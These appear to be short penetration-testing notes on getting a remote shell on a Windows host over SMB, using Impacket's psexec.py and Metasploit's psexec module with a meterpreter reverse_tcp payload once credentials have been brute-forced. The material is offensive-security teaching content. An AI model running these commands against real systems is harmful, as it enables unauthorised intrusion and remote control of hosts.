
### How to use `psexec.py` to login with `SMB`?

*We are assuming that we've already brute-forced SMB to find the login credentials.*

1. We can use the `locate` command to get the path to the `psexec.py` file.

2. The file is stored in the following path
```
/usr/share/doc/python3-impacket/examples/psexec.py
```

3. We can copy the Python file in the `pwd` to make it more accessible using the `cp` command.

4. Give the `psexec.py` executable permissions. 
```
chmod +x psexec.py
```

5. Login using `psexec`.
```
python3 psexec.py <username>@<target-ip> 
```
 
6. `psexec.py` will then login and gave us a command shell session by uploading and executing a reverse shell payload.

### `MSF` module to use `psexec`

1. Metasploit comes with a module for `psexec`. It requires that we already know the login credentials.
```
use exploit/windows/smb/psexec
```

2. Set the payload.
```
set payload windows/x64/meterpreter/reverse_tcp
```

3. This will provide us a with a `meterpreter` shell.
